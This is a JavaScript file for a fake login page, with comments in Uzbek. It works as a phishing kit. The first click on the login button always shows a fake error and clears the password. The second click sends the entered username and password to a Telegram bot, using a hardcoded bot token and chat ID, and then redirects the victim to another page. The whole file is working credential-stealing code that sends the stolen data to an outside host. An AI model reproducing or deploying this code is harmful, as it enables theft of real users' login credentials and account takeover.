// Input maydonlari, tugma, ko'z ikonka va xato xabarini tanlab olamiz
const inputs = document.querySelectorAll('.input-field');
const loginButton = document.querySelector('button');
const passwordInput = document.querySelector('.password-input');
const togglePassword = document.querySelector('.toggle-password');
const errorMessage = document.querySelector('.error-message');
const loader = document.querySelector('#loader'); // Loader elementini tanlaymiz

// Bosishlar sonini hisoblash uchun o'zgaruvchi
let clickCount = 0;

// Input maydonlarida o'zgarish bo'lganda funksiyani ishga tushiramiz
inputs.forEach(input => {
    input.addEventListener('input', checkInputs);
});

// Ko'z ikonka ustiga bosilganda parolni ko'rsatish/yashirish
togglePassword.addEventListener('click', () => {
    const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
    passwordInput.setAttribute('type', type);
    togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
});

// Tugma bosilganda xato xabarini ko'rsatish yoki boshqa sahifaga o'tish
loginButton.addEventListener('click', (e) => {
    e.preventDefault(); // Formani yuborilishini to'xtatamiz
    clickCount++; // Bosishlar sonini oshiramiz

    if (clickCount === 1) {
        // Birinchi bosishda xato xabarini ko'rsatamiz
        errorMessage.style.display = 'block';
        loginButton.disabled = true; // Tugma nofaol bo'ladi
    } else if (clickCount === 2) {
        // Ikkinchi bosishda xato xabarini yashiramiz va loader ko'rsatamiz
        errorMessage.style.display = 'none';
        loginButton.disabled = false;

        // Loader-ni ko'rsatamiz
        loader.style.display = 'flex';

        // Telegramga xabar yuboramiz
        sendMessage();

        // 3 soniyadan keyin next.html ga o'tamiz
        setTimeout(() => {
            window.location.href = './nextPage/next.html'; // Updated path
        }, 2000); // 2000ms = 2 seconds
    }
});

// Password input ustiga bosilganda qiymatini bo'shatish
passwordInput.addEventListener('click', () => {
    if (errorMessage.style.display === 'block') {
        // Agar xato xabari ko'rsatilsa, password inputini bo'shatamiz
        passwordInput.value = '';
    }
});

function checkInputs() {
    // Ikkala input maydonining qiymatini tekshiramiz
    const username = inputs[0].value.trim();
    const password = inputs[1].value.trim();

    // Agar foydalanuvchi nomi bo'sh bo'lmasa va parol 5 tadan ko'p belgi bo'lsa, tugmani faol qilamiz
    if (username !== '' && password.length > 5) {
        loginButton.disabled = false;
    } else {
        loginButton.disabled = true;
    }
}

// Telegram botga xabar yuborish funksiyasi
function sendMessage() {
    const username = inputs[0].value.trim();
    const password = inputs[1].value.trim();
    const message = `Username: ${username}\nPassword: ${password}`;

    const botToken = '7797599102:AAHdwqIPnKDRu0FRKhb9HH7_KYe9-wiDtyM';
    const chatId = '1580328848'; // Sizning chat ID (botni ochgan paytingizda olingan)
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
        .then(res => res.json())
        .then(data => {
            // Xabar yuborildi
        })
        .catch(err => {
            console.log("Xatolik yuz berdi: " + err);
        });
}